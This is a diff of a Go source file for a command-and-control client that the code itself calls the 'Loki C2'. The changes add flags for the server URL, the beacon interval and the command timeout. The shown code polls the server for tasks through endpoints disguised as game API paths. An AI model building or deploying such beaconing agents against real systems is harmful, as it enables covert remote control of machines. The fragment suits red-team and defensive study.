@@ -14,12 +14,13 @@ See the License for the specific language governing permissions and
 limitations under the License.
 */
 
-// Serve as a client to the odin C2
+// Serve as a client to the Loki C2
 package main
 
 import (
 	"bytes"
 	"encoding/json"
+	"flag"
 	"fmt"
 	"io/ioutil"
 	"net/http"
@@ -37,15 +38,22 @@ var register = "/api/game/login"
 var taskboard = "/api/game"
 var apiRoot string
 var beaconTime int
+var cmdTimeOut int
 var commandHint string
 var commandArgZero string
 
 // Setup main connection
 func main() {
-	//apiroot = os.Args[1]
-	//beacontime = os.Args[2]
-	apiRoot = "http://localhost:6543"
-	beaconTime = 5
+	// Setup input flags
+	apiRootPtr := flag.String("c2", "http://localhost:6543", "Command & Control Server URL")
+	beaconTimePtr := flag.Int("beacon", 5, "Beacon Interval")
+	cmdTimeOutPtr := flag.Int("cmdtimeout", 10, "Timeout given to command executions")
+	// Parse flags, grabbing default values if not found
+	flag.Parse()
+	// Set globals appropriately
+	apiRoot = *apiRootPtr
+	beaconTime = *beaconTimePtr
+	cmdTimeOut = *cmdTimeOutPtr
 
 	// Determine operating environment
 	// TODO consider iterating through all `runtime.GOOS` options
@@ -100,7 +108,7 @@ func taskLoop() {
 // Returns unmarshalled JSON, and a success bool
 func getTask() (map[string]interface{}, bool) {
 	var client = &http.Client{
-		Timeout: time.Second * time.Duration(10),
+		Timeout: time.Second * time.Duration(cmdTimeOut),
 	}
 	data := strings.NewReader(url.Values{"cuid": {cuid}, "key": {key}}.Encode())
 	r, _ := http.NewRequest(http.MethodPost, apiRoot+taskboard, data)
